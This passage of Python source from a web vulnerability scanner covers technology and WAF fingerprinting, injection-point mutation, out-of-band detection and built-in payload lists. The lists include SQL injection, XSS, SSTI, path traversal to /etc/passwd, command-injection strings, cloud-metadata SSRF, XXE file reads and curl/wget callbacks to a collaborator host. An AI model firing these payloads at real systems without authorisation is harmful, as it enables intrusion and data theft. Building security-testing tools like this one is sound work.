                    "WHERE false_positive=0 ORDER BY timestamp DESC LIMIT 1"
                ) as cur:
                    row = await cur.fetchone()
                    if row:
                        result["top_finding"] = row[0]
        except Exception as exc:
            logger.error("ScanEngine.get_stats error: %s", exc)
        return result

FILE: modules/scanner/fingerprint.py

"""Technology Fingerprinting — detecting the target stack before scanning.

One baseline request -> TechProfile with a set of flags.
Checks use TechProfile to skip irrelevant payloads.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from pentool.utils.http_client import HTTPClient


@dataclass
class WafInfo:
    detected: bool = False
    name: str = ""          # "Cloudflare", "ModSecurity", "AWS WAF", ...
    confidence: int = 0     # 0-100


@dataclass
class TechProfile:
    """Fingerprinting result for one origin."""

    # Server stack
    is_php: bool = False
    is_java: bool = False
    is_dotnet: bool = False
    is_nodejs: bool = False
    is_python: bool = False
    is_ruby: bool = False
    is_golang: bool = False

    # Frameworks
    is_django: bool = False
    is_rails: bool = False
    is_laravel: bool = False
    is_spring: bool = False
    is_express: bool = False
    is_flask: bool = False

    # Content
    accepts_json: bool = False
    accepts_xml: bool = False
    has_xml_response: bool = False

    # WAF
    waf: WafInfo = field(default_factory=WafInfo)

    # Raw data for debugging
    server_header: str = ""
    powered_by: str = ""
    status_code: int = 0

    def allows_check(self, check_name: str) -> bool:
        """Return False if the check is clearly irrelevant for this stack."""
        cn = check_name.lower()

        if cn == "xxe":
            return self.accepts_xml or self.has_xml_response

        if cn == "ssti":
            # SSTI is relevant for all server-side stacks
            return True

        if cn == "prototype_pollution":
            return self.is_nodejs or self.is_express

        if cn == "lfi" or cn == "path_traversal":
            # PHP wrappers only on PHP
            return True  # basic LFI — everywhere; PHP-specific filtered by the check itself

        return True


# ── Signatures ─────────────────────────────────────────────────────────────────

_WAF_SIGNATURES: list[tuple[str, str, int]] = [
    # (header_or_body_pattern, waf_name, confidence)
    (r"cloudflare", "Cloudflare", 90),
    (r"__cfduid|cf-ray|cf-cache-status", "Cloudflare", 85),
    (r"x-sucuri-id|sucuri", "Sucuri", 90),
    (r"x-fw-hash|x-fw-server", "Fastly WAF", 80),
    (r"x-amzn-requestid|x-amz-cf-id|awselb", "AWS WAF/ALB", 75),
    (r"akamai|x-akamai", "Akamai", 80),
    (r"mod_security|modsecurity", "ModSecurity", 90),
    (r"x-protected-by.*snapt|snapt", "Snapt", 80),
    (r"barracuda", "Barracuda", 80),
    (r"x-iinfo|incapsula", "Imperva Incapsula", 85),
    (r"x-cdn.*imperva|imperva", "Imperva", 85),
    (r"fortigate|fortiWeb", "FortiWeb", 80),
    (r"x-powered-by.*f5|bigip", "F5 BIG-IP", 80),
]

_SERVER_SIGNATURES: list[tuple[str, str]] = [
    (r"php", "php"),
    (r"apache", "apache"),
    (r"nginx", "nginx"),
    (r"iis|asp\.net|microsoft", "dotnet"),
    (r"tomcat|jboss|jetty|glassfish|weblogic|websphere", "java"),
    (r"express|node", "nodejs"),
    (r"gunicorn|uwsgi|werkzeug|django|flask", "python"),
    (r"passenger|puma|unicorn|thin", "ruby"),
    (r"caddy|go ", "golang"),
]

_FRAMEWORK_SIGNATURES: list[tuple[str, str]] = [
    (r"laravel_session|laravel", "laravel"),
    (r"django|csrftoken|x-csrftoken", "django"),
    (r"rack\.|_rails_|x-runtime.*ruby", "rails"),
    (r"jsessionid|x-powered-by.*spring", "spring"),
    (r"x-powered-by.*express", "express"),
    (r"x-powered-by.*flask", "flask"),
]


def _headers_blob(headers: dict[str, str]) -> str:
    return " ".join(f"{k}: {v}" for k, v in headers.items()).lower()


class TechFingerprinter:
    """Determines the target stack from a single baseline request."""

    async def fingerprint(self, url: str, http_client: "HTTPClient") -> TechProfile:
        profile = TechProfile()
        try:
            resp = await http_client.get(url)
        except Exception:
            return profile

        profile.status_code = resp.status_code
        headers: dict[str, str] = {k.lower(): v.lower() for k, v in resp.headers.items()}
        profile.server_header = headers.get("server", "")
        profile.powered_by = headers.get("x-powered-by", "")

        blob = _headers_blob(headers)
        body_lower = (resp.text or "")[:2000].lower()
        combined = blob + " " + body_lower

        # ── WAF ───────────────────────────────────────────────────────────────
        for pattern, name, conf in _WAF_SIGNATURES:
            if re.search(pattern, combined, re.I):
                if conf > profile.waf.confidence:
                    profile.waf = WafInfo(detected=True, name=name, confidence=conf)

        # ── Server stack ──────────────────────────────────────────────────────
        for pattern, tech in _SERVER_SIGNATURES:
            if re.search(pattern, combined, re.I):
                setattr(profile, f"is_{tech}", True)

        # ── Frameworks ────────────────────────────────────────────────────────
        for pattern, fw in _FRAMEWORK_SIGNATURES:
            if re.search(pattern, combined, re.I):
                setattr(profile, f"is_{fw}", True)

        # ── Content-type ──────────────────────────────────────────────────────
        ct = headers.get("content-type", "")
        if "xml" in ct:
            profile.has_xml_response = True
        accept = headers.get("accept", "")
        if "json" in ct or "json" in accept:
            profile.accepts_json = True
        if "xml" in accept:
            profile.accepts_xml = True

        return profile

FILE: modules/scanner/helpers.py

"""Scanner helpers — URL filtering and deduplication by template."""

from __future__ import annotations

import re
from urllib.parse import urlparse

# Static resource extensions — not scanned
_STATIC_EXTENSIONS: frozenset[str] = frozenset({
    # Images
    "jpg", "jpeg", "png", "gif", "webp", "svg", "ico", "bmp", "tiff", "avif",
    # Styles and fonts
    "css", "woff", "woff2", "ttf", "eot", "otf",
    # Scripts and data (bundles — not injection points)
    "js", "mjs", "map",
    # Media
    "mp3", "mp4", "webm", "ogg", "wav", "avi", "mov", "flv",
    # Documents
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
    # Archives
    "zip", "tar", "gz", "bz2", "7z", "rar",
    # Other
    "txt", "xml", "rss", "atom",
})

# Path segments that indicate static content
_STATIC_PATH_SEGMENTS: frozenset[str] = frozenset({
    "static", "assets", "dist", "build", "public", "media",
    "images", "img", "fonts", "icons", "css", "js",
})

# Numeric segment or UUID
_NUMERIC_RE = re.compile(r"^\d+$")
_UUID_RE = re.compile(
    r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
    re.I,
)


def is_scannable_url(url: str) -> bool:
    """Return True if the URL should be scanned (not static content)."""
    try:
        parsed = urlparse(url)
    except Exception:
        return False

    path = parsed.path.lower()

    # Check extension
    dot = path.rfind(".")
    if dot != -1:
        ext = path[dot + 1:].split("?")[0].split("#")[0]
        if ext in _STATIC_EXTENSIONS:
            return False

    # Check path segments
    segments = [s for s in path.split("/") if s]
    for seg in segments:
        if seg in _STATIC_PATH_SEGMENTS:
            return False

    return True


def path_template(url: str) -> str:
    """Normalize a URL into a template for deduplication.

    /api/users/123        -> /api/users/{id}
    /api/users/abc-def-1  -> /api/users/{id}
    /posts/2024/01/title  -> /posts/{id}/{id}/title
    """
    try:
        parsed = urlparse(url)
    except Exception:
        return url

    segments = parsed.path.split("/")
    normalized = []
    for seg in segments:
        if _NUMERIC_RE.match(seg) or _UUID_RE.match(seg):
            normalized.append("{id}")
        else:
            normalized.append(seg)

    # Drop query — different values of the same parameter = one template
    from urllib.parse import urlencode, parse_qs
    params = parse_qs(parsed.query, keep_blank_values=True)
    # Sort keys, replace values with {v}
    norm_query = urlencode(sorted((k, "{v}") for k in params)) if params else ""

    result = "/".join(normalized)
    if norm_query:
        result += "?" + norm_query
    return result

FILE: modules/scanner/mutator.py
--------------------------------------------------------------------------------
"""RequestMutator — extracting injection points and mutating requests.

Approach:
  1. extract_points(req) -> list of all injection points in the request
  2. mutate(req, point, payload) -> clone of the request with payload at one point

Supported points:
  - GET parameters (?param=value)
  - POST urlencoded (body=param=value&...)
  - JSON body fields (recursively all string fields)
  - Cookie values
  - HTTP headers (Referer, User-Agent, X-Forwarded-For, etc.)
  - Path segments (numeric IDs, UUIDs)
  - Multipart form fields
"""

from __future__ import annotations

import copy
import json
import re
from dataclasses import dataclass, field
from typing import TYPE_CHECKING
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

if TYPE_CHECKING:
    from pentool.utils.parser import ParsedRequest

# ── Scoring constants ──────────────────────────────────────────────────────────

_HIGH_RISK_NAMES: frozenset[str] = frozenset({
    "id", "user", "username", "name", "file", "path", "page",
    "include", "src", "source", "doc", "template", "view",
    "cmd", "command", "exec", "query", "search", "q",
    "redirect", "return", "next", "url", "uri", "link",
    "callback", "dest", "host", "server", "ip", "addr",
    "token", "key", "pass", "password", "secret", "hash",
    "email", "phone", "data", "payload", "input", "output",
    "from", "to", "subject", "msg", "message", "text",
    "action", "type", "mode", "format", "lang", "locale",
    "cat", "category", "tag", "filter", "sort", "order",
    "param", "var", "val", "value", "arg",
})

_LOW_RISK_NAMES: frozenset[str] = frozenset({
    "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content",
    "fbclid", "gclid", "_ga", "ga_", "ref",
    "theme", "color", "skin", "style",
    "per_page", "limit", "offset", "size",
    "v", "version", "ts", "timestamp", "t", "_t",
    "cache", "nocache", "debug",
    "csrf_token", "authenticity_token",
})

_UUID_RE = re.compile(
    r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
    re.I,
)

_URL_VALUE_RE = re.compile(r"^https?://", re.I)
_PATH_VALUE_RE = re.compile(r"^\.{0,2}/|^\.\.\\")


def _score_point(point: "InjectionPoint") -> int:
    """Calculate the priority of an injection point. Higher = tested sooner."""
    score = 0
    name_lower = (point.name or "").lower().split("[")[0]  # strip [0] from JSON path
    val = point.original_value or ""

    # ── Point type (base weight) ───────────────────────────────────────────────
    if point.kind == "path":
        score += 35
    elif point.kind == "get":
        score += 20
    elif point.kind in ("post", "json"):
        score += 15
    elif point.kind == "cookie":
        score += 10
    elif point.kind == "header":
        score += 5

    # ── Parameter value ────────────────────────────────────────────────────────
    if val.isdigit():
        score += 40        # numeric ID — highest risk (SQLi, IDOR)
    elif _UUID_RE.match(val):
        score += 35        # UUID in path
    elif _URL_VALUE_RE.match(val):
        score += 30        # URL value -> SSRF
    elif _PATH_VALUE_RE.match(val):
        score += 25        # path-like value -> LFI/Path Traversal

    # ── Parameter name ─────────────────────────────────────────────────────────
    if name_lower in _HIGH_RISK_NAMES:
        score += 30
    elif name_lower in _LOW_RISK_NAMES:
        score -= 15

    # ── Penalties ──────────────────────────────────────────────────────────────
    if not val:
        score -= 10
    if len(val) > 200:
        score -= 5         # very long values are likely tokens

    return score

# Headers tested as injection points
_INJECTABLE_HEADERS = [
    "Referer",
    "User-Agent",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Custom-IP-Authorization",
    "X-Host",
    "X-HTTP-Host-Override",
]

# Pattern for numeric IDs and UUIDs in path
_PATH_SEGMENT_RE = re.compile(
    r"/(\d{1,10}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?=/|$)"
)


@dataclass
class InjectionPoint:
    """A single injection point in a request."""
    kind: str          # "get" | "post" | "json" | "cookie" | "header" | "path" | "multipart"
    name: str          # parameter name / header name / path position
    original_value: str
    # For JSON — path to the field ("user.name", "items[0].id")
    json_path: str = ""
    # For path — start/end positions in the path string
    path_start: int = 0
    path_end: int = 0
    # Priority: higher = tested sooner (calculated automatically)
    priority: int = field(default=0, compare=False)


class RequestMutator:
    """Extracts injection points from a request and creates mutated copies."""

    # ── Point extraction ─────────────────────────────────────────────────────

    def extract_points(self, req: "ParsedRequest") -> list[InjectionPoint]:
        """Return all injection points from the request, sorted by priority."""
        points: list[InjectionPoint] = []
        points.extend(self._get_params(req))
        points.extend(self._post_params(req))
        points.extend(self._json_params(req))
        points.extend(self._cookie_params(req))
        points.extend(self._header_params(req))
        points.extend(self._path_params(req))
        for p in points:
            p.priority = _score_point(p)
        points.sort(key=lambda p: p.priority, reverse=True)
        return points

    def _get_params(self, req: "ParsedRequest") -> list[InjectionPoint]:
        parsed = urlparse(req.url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        return [
            InjectionPoint(kind="get", name=k, original_value=(v[0] if v else ""))
            for k, v in params.items()
        ]

    def _post_params(self, req: "ParsedRequest") -> list[InjectionPoint]:
        body = getattr(req, "body", "") or ""
        if isinstance(body, bytes):
            body = body.decode("utf-8", errors="replace")
        ct = self._content_type(req)
        if "json" in ct or not body.strip():
            return []
        if body.strip().startswith(("{", "[")):
            return []
        try:
            params = parse_qs(body, keep_blank_values=True)
            return [
                InjectionPoint(kind="post", name=k, original_value=(v[0] if v else ""))
                for k, v in params.items()
            ]
        except Exception:
            return []

    def _json_params(self, req: "ParsedRequest") -> list[InjectionPoint]:
        body = getattr(req, "body", "") or ""
        if isinstance(body, bytes):
            body = body.decode("utf-8", errors="replace")
        ct = self._content_type(req)
        if not body.strip():
            return []
        if "json" not in ct and not body.strip().startswith(("{", "[")):
            return []
        try:
            obj = json.loads(body)
        except Exception:
            return []
        points = []
        self._walk_json(obj, "", points)
        return points

    def _walk_json(self, obj, prefix: str, out: list[InjectionPoint]) -> None:
        if isinstance(obj, dict):
            for k, v in obj.items():
                path = f"{prefix}.{k}" if prefix else k
                if isinstance(v, str):
                    out.append(InjectionPoint(kind="json", name=k,
                                              original_value=v, json_path=path))
                elif isinstance(v, (int, float, bool)) and not isinstance(v, bool):
                    out.append(InjectionPoint(kind="json", name=k,
                                              original_value=str(v), json_path=path))
                elif isinstance(v, (dict, list)):
                    self._walk_json(v, path, out)
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                path = f"{prefix}[{i}]"
                if isinstance(item, str):
                    out.append(InjectionPoint(kind="json", name=f"[{i}]",
                                              original_value=item, json_path=path))
                elif isinstance(item, (dict, list)):
                    self._walk_json(item, path, out)

    def _cookie_params(self, req: "ParsedRequest") -> list[InjectionPoint]:
        headers = getattr(req, "headers", {}) or {}
        cookie_str = ""
        for k, v in headers.items():
            if k.lower() == "cookie":
                cookie_str = v
                break
        if not cookie_str:
            return []
        points = []
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                name, _, val = part.partition("=")
                points.append(InjectionPoint(
                    kind="cookie", name=name.strip(), original_value=val.strip()
                ))
        return points

    def _header_params(self, req: "ParsedRequest") -> list[InjectionPoint]:
        headers = getattr(req, "headers", {}) or {}
        existing = {k.lower() for k in headers}
        points = []
        for hdr in _INJECTABLE_HEADERS:
            orig = headers.get(hdr, headers.get(hdr.lower(), ""))
            points.append(InjectionPoint(
                kind="header", name=hdr, original_value=orig
            ))
        return points

    def _path_params(self, req: "ParsedRequest") -> list[InjectionPoint]:
        parsed = urlparse(req.url)
        path = parsed.path
        points = []
        for match in _PATH_SEGMENT_RE.finditer(path):
            points.append(InjectionPoint(
                kind="path",
                name=f"path:{match.group(1)}",
                original_value=match.group(1),
                path_start=match.start(1),
                path_end=match.end(1),
            ))
        return points

    # ── Request mutation ─────────────────────────────────────────────────────

    def mutate(self, req: "ParsedRequest", point: InjectionPoint,
               payload: str) -> "ParsedRequest":
        """Return a clone of the request with the payload inserted at the given point."""
        from pentool.utils.parser import ParsedRequest as PR
        new_req = PR(
            method=req.method,
            url=req.url,
            headers=dict(req.headers),
            body=req.body or "",
        )

        if point.kind == "get":
            new_req.url = self._inject_get(req.url, point.name, payload)

        elif point.kind == "post":
            new_req.body = self._inject_post(req.body or "", point.name, payload)

        elif point.kind == "json":
            new_req.body = self._inject_json(req.body or "", point.json_path, payload)

        elif point.kind == "cookie":
            new_req.headers = dict(req.headers)
            new_req.headers = self._inject_cookie(
                new_req.headers, point.name, payload
            )

        elif point.kind == "header":
            new_req.headers = dict(req.headers)
            new_req.headers[point.name] = payload

        elif point.kind == "path":
            parsed = urlparse(req.url)
            path = parsed.path
            new_path = path[:point.path_start] + payload + path[point.path_end:]
            new_req.url = urlunparse(parsed._replace(path=new_path))

        return new_req

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _inject_get(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def _inject_post(self, body: str, param: str, payload: str) -> str:
        try:
            params = parse_qs(body, keep_blank_values=True)
            params[param] = [payload]
            return urlencode(params, doseq=True)
        except Exception:
            return body

    def _inject_json(self, body: str, json_path: str, payload: str) -> str:
        try:
            obj = json.loads(body)
            obj = self._set_json_path(obj, json_path, payload)
            return json.dumps(obj)
        except Exception:
            return body

    def _set_json_path(self, obj, path: str, value):
        obj = copy.deepcopy(obj)
        parts = []
        for seg in path.replace("[", ".").replace("]", "").split("."):
            if not seg:
                continue
            parts.append(int(seg) if seg.isdigit() else seg)
        target = obj
        for part in parts[:-1]:
            target = target[part]
        if parts:
            target[parts[-1]] = value
        return obj

    def _inject_cookie(self, headers: dict, cookie_name: str, payload: str) -> dict:
        new_headers = dict(headers)
        cookie_str = ""
        cookie_key = None
        for k, v in new_headers.items():
            if k.lower() == "cookie":
                cookie_str = v
                cookie_key = k
                break
        cookies: dict[str, str] = {}
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                n, _, v = part.partition("=")
                cookies[n.strip()] = v.strip()
        cookies[cookie_name] = payload
        new_val = "; ".join(f"{n}={v}" for n, v in cookies.items())
        if cookie_key:
            new_headers[cookie_key] = new_val
        else:
            new_headers["Cookie"] = new_val
        return new_headers

    @staticmethod
    def _content_type(req: "ParsedRequest") -> str:
        headers = getattr(req, "headers", {}) or {}
        for k, v in headers.items():
            if k.lower() == "content-type":
                return v.lower()
        return ""


__all__ = ["InjectionPoint", "RequestMutator"]

FILE: modules/scanner/oob.py

"""OOB (Out-of-Band) detection for the Scanner.

Integrates with Collaborator-like services (Burp Collaborator, interactsh).
If collaborator_url is set in Config — OOB checks are enabled in SSRF and RCE.
"""

from __future__ import annotations

import re
import uuid
from typing import Any


class OOBHelper:
    """Generator of OOB payloads and interaction detector."""

    def __init__(self, collaborator_url: str = "") -> None:
        """
        Args:
            collaborator_url: Base URL of the collaborator service.
                Example: "https://xxx.oastify.com" or "http://interact.sh"
        """
        self._base_url = collaborator_url.rstrip("/")
        self._interactions: dict[str, str] = {}  # uid -> description

    @property
    def enabled(self) -> bool:
        """True if a collaborator URL is configured."""
        return bool(self._base_url)

    def generate_payload(self, prefix: str = "") -> tuple[str, str]:
        """Generate an OOB payload.

        Returns:
            (uid, oob_url) — uid for tracking, oob_url for insertion into a payload.
        """
        uid = uuid.uuid4().hex[:12]
        tag = f"{prefix}-{uid}" if prefix else uid
        # Build subdomain or path-based URL
        if "://" in self._base_url:
            # Subdomain-based: http://tag.example.com
            proto, rest = self._base_url.split("://", 1)
            oob_url = f"{proto}://{tag}.{rest}"
        else:
            oob_url = f"http://{tag}.{self._base_url}"
        self._interactions[uid] = "pending"
        return uid, oob_url

    def get_ssrf_payloads(self) -> list[str]:
        """Generate OOB SSRF payloads."""
        if not self.enabled:
            return []
        _, url_http = self.generate_payload("ssrf")
        _, url_dns = self.generate_payload("dns")
        return [
            url_http,
            url_dns,
            f"http://{url_dns}",
            f"https://{url_dns}",
        ]

    def get_rce_payloads(self) -> list[str]:
        """Generate OOB RCE payloads (DNS lookup triggers)."""
        if not self.enabled:
            return []
        _, oob_url = self.generate_payload("rce")
        # Extract only the host for DNS-based detection
        host = oob_url.replace("https://", "").replace("http://", "").split("/")[0]
        return [
            f"nslookup {host}",
            f"ping -c 1 {host}",
            f"curl {oob_url}",
            f"wget -q {oob_url}",
            f"`curl {oob_url}`",
            f"$(curl {oob_url})",
        ]

    def is_configured(self) -> bool:
        """Alias for enabled — used by check modules."""
        return self.enabled

    def get_url(self, prefix: str = "") -> str:
        """Generate a single OOB URL for use in a payload."""
        _, url = self.generate_payload(prefix)
        return url

    async def check_interactions(self) -> list[dict[str, Any]]:
        """Check for interactions on the collaborator server.

        Returns:
            List of detected interactions.
        """
        return []


def get_oob_helper() -> OOBHelper:
    """Get an OOB helper with the current collaborator URL from Config."""
    try:
        from pentool.core.config import get_config
        cfg = get_config()
        collab_url = getattr(cfg, "collaborator_url", "")
        return OOBHelper(collab_url)
    except Exception:
        return OOBHelper("")

FILE: modules/scanner/passive.py

"""PassiveScanner — subscribes to the EventBus and analyzes traffic.

Sprint 3: PassiveScanner no longer depends on ProxyServer directly.
Subscribes to ProxyRequestCompleted via EventBus — full decoupling
of modules/scanner from modules/proxy.
"""

from __future__ import annotations

import asyncio
from typing import TYPE_CHECKING, Callable

from pentool.core.event_bus import get_event_bus
from pentool.core.events import ProxyRequestCompleted
from pentool.core.logging import get_logger
from pentool.modules.scanner.base import Finding

if TYPE_CHECKING:
    from pentool.modules.scanner.engine import ScanEngine

logger = get_logger(__name__)


class PassiveScanner:
    """Subscribes to the EventBus and runs passive checks on each request."""

    def __init__(self, engine: "ScanEngine") -> None:
        self._engine = engine
        self._subscribed: bool = False
        self.on_finding: Callable[[Finding], None] | None = None

    # ── EventBus path (primary, Sprint 3) ───────────────────────────────────

    def attach_bus(self) -> None:
        """Subscribe to ProxyRequestCompleted via EventBus.

        Does not require a reference to ProxyServer — fully decoupled.
        """
        if self._subscribed:
            return
        get_event_bus().subscribe(ProxyRequestCompleted, self._on_bus_completed)
        self._subscribed = True
        logger.info("PassiveScanner attached via EventBus")

    def detach_bus(self) -> None:
        """Unsubscribe from the EventBus."""
        if not self._subscribed:
            return
        get_event_bus().unsubscribe(ProxyRequestCompleted, self._on_bus_completed)
        self._subscribed = False
        logger.info("PassiveScanner detached from EventBus")

    def _on_bus_completed(self, event: ProxyRequestCompleted) -> None:
        """Called by EventBus from the proxy thread when a request completes.

        event.request contains the full InterceptedRequest.
        Creates a Task in the current event loop (proxy loop or TUI loop).
        """
        ireq = event.request
        if ireq is None:
            return
        try:
            loop = asyncio.get_running_loop()
            loop.create_task(self._analyze(ireq))
        except RuntimeError:
            # No running loop — do nothing (tests without a loop)
            pass

    # ── Legacy proxy-callback path (backward compatibility) ──────────────────

    def attach(self, proxy) -> None:
        """[Legacy] Subscribe to the proxy on_request_done callback.

        Kept for backward compatibility with tests and old code.
        New code should use attach_bus().
        """
        proxy.add_request_done_callback(self._on_request_done)
        logger.info("PassiveScanner attached to proxy (legacy callback)")

    def detach(self, proxy) -> None:
        """[Legacy] Unsubscribe from the proxy callback."""
        proxy.remove_request_done_callback(self._on_request_done)
        logger.info("PassiveScanner detached from proxy (legacy callback)")

    def _on_request_done(self, req) -> None:
        """[Legacy] Called by the proxy callback when a request completes."""
        try:
            loop = asyncio.get_running_loop()
            loop.create_task(self._analyze(req))
        except RuntimeError:
            pass

    # ── Common analysis ──────────────────────────────────────────────────────

    async def _analyze(self, req) -> None:
        """Analyze a request with passive checks."""
        if getattr(req, "response", None) is None:
            return
        try:
            from pentool.utils.parser import ParsedRequest
            parsed_req = ParsedRequest(
                method=req.method,
                url=req.url,
                headers=req.headers,
                body=req.body,
            )
            findings = await self._engine.run_passive(parsed_req, req.response)
            if findings:
                await self._engine.save_findings(findings)
                if self.on_finding:
                    for f in findings:
                        self.on_finding(f)
        except Exception as exc:
            logger.warning("PassiveScanner._analyze error: %s", exc)

"""Payload loader and generator for active scanning."""

from __future__ import annotations

from pathlib import Path


from pentool.core.logging import get_logger

logger = get_logger(__name__)

# Path to built-in payloads
_BUILTIN_DIR = Path(__file__).parent.parent.parent / "payloads"


def load_payloads(vuln_type: str, custom_dir: str | None = None) -> list[str]:
    """Load payloads for a vulnerability type.

    Search order:
    1. custom_dir (if provided)
    2. Built-in folder pentool/payloads/
    3. Built-in generator (fallback)
    """
    dirs_to_try: list[Path] = []
    if custom_dir:
        dirs_to_try.append(Path(custom_dir))
    dirs_to_try.append(_BUILTIN_DIR)

    for search_dir in dirs_to_try:
        for ext in (".yaml", ".yml", ".txt"):
            candidate = search_dir / f"{vuln_type}{ext}"
            if candidate.exists():
                payloads = _load_file(candidate)
                if payloads:
                    logger.debug(
                        "Loaded %d payloads for %s from %s",
                        len(payloads), vuln_type, candidate,
                    )
                    return payloads

    # Built-in generation if no file is found
    logger.debug("No payload file for %s, using built-in generator", vuln_type)
    return generate_payloads(vuln_type)


def load_signatures(vuln_type: str, custom_dir: str | None = None) -> list[str]:
    """Load signatures for a vulnerability type."""
    dirs_to_try: list[Path] = []
    if custom_dir:
        dirs_to_try.append(Path(custom_dir))
    dirs_to_try.append(_BUILTIN_DIR)

    for search_dir in dirs_to_try:
        for ext in (".yaml", ".yml"):
            candidate = search_dir / f"{vuln_type}{ext}"
            if candidate.exists():
                sigs = _load_signatures_from_yaml(candidate)
                if sigs:
                    return sigs

    return []


def _load_file(path: Path) -> list[str]:
    """Load payloads from a yaml or txt file."""
    try:
        if path.suffix in (".yaml", ".yml"):
            return _load_from_yaml(path)
        else:
            return _load_from_txt(path)
    except Exception as exc:
        logger.warning("Error loading payloads from %s: %s", path, exc)
        return []


def _load_from_yaml(path: Path) -> list[str]:
    import yaml

    with open(path, encoding="utf-8") as f:
        data = yaml.safe_load(f)
    if isinstance(data, dict) and "payloads" in data:
        return [str(p) for p in data["payloads"]]
    if isinstance(data, list):
        return [str(p) for p in data]
    return []


def _load_signatures_from_yaml(path: Path) -> list[str]:
    import yaml

    with open(path, encoding="utf-8") as f:
        data = yaml.safe_load(f)
    if isinstance(data, dict) and "signatures" in data:
        return [str(s) for s in data["signatures"]]
    return []


def _load_from_txt(path: Path) -> list[str]:
    with open(path, encoding="utf-8", errors="replace") as f:
        return [
            line.strip()
            for line in f
            if line.strip() and not line.startswith("#")
        ]


def generate_payloads(vuln_type: str) -> list[str]:
    """Built-in generator for basic payloads (when no file is found)."""
    generators = {
        "sqli": _gen_sqli,
        "xss": _gen_xss,
        "ssti": _gen_ssti,
        "lfi": _gen_lfi,
        "rce": _gen_rce,
        "open_redirect": _gen_redirect,
        "ssrf": _gen_ssrf,
        "xxe": _gen_xxe,
    }
    gen = generators.get(vuln_type)
    if gen:
        return gen()
    return []


def _gen_sqli() -> list[str]:
    return [
        "'",
        "\"",
        "1' OR '1'='1",
        "1 OR 1=1",
        "' OR 1=1--",
        "1; SELECT 1--",
        "1 UNION SELECT NULL--",
        "' UNION SELECT NULL--",
        "admin'--",
        "') OR ('1'='1",
    ]


def _gen_xss() -> list[str]:
    return [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        "'><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "';alert(1);//",
    ]


def _gen_ssti() -> list[str]:
    return [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "{{config}}",
        "<%= 7*7 %>",
        "{{7*'7'}}",
        "@(7+7)",
        "{{''.__class__}}",
    ]


def _gen_lfi() -> list[str]:
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "/%5C../%5C../etc/passwd",
        "/proc/self/environ",
    ]


def _gen_rce() -> list[str]:
    return [
        ";id",
        "&&id",
        "|id",
        "$(id)",
        "`id`",
        "; cat /etc/passwd",
        "| whoami",
        ";whoami;",
    ]


def _gen_redirect() -> list[str]:
    return [
        "//evil.com",
        "https://evil.com",
        "//evil.com/%2f..",
        "https://evil.com/",
        "///evil.com",
        "\\\\evil.com",
        "https:evil.com",
    ]


def _gen_ssrf() -> list[str]:
    return [
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://192.168.0.1/",
        "http://10.0.0.1/",
    ]


def _gen_xxe() -> list[str]:
    return [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
    ]


__all__ = ["load_payloads", "load_signatures", "generate_payloads"]
